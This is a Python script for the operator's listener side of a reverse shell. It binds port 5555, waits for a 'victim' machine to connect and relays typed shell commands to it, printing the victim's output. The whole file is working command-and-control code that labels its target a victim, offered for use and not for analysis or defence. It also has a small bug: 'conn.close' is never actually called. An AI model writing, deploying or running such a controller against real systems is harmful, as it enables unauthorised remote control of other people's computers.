import socket
import sys


def create_socket():
    global host
    global port
    global s
    # global cmd
    # global conn
    host = ''
    port = 5555
    s = socket.socket()


def bind_socket():
    global host
    global port
    global s
    s.bind((host, port))
    print("Socket binding completed !")
    s.listen(10)
    print("Listening to victim...")


def socket_accept():
    while True:
        conn, addr = s.accept()
        print("Connection established !! IP:", addr[0])
        send_command(conn)
        # transfer(conn)


def send_command(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_res = str(conn.recv(8192), "utf-8")
            print(client_res, end="")



def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
